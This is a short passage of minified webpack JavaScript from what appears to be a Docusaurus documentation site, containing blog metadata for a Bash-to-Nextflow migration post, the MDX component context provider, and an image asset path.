Framework","permalink":"/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline"}}')},8453(e,n,i){i.d(n,{R:()=>o,x:()=>l});var r=i(6540);const s={},t=r.createContext(s);function o(e){const n=r.useContext(t);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),r.createElement(t.Provider,{value:n},e.children)}},9831(e,n,i){i.d(n,{A:()=>r});const r=i.p+"assets/images/intro-7aaa912f8e48c1bb524eacaf56d8a3cd.png"}}]);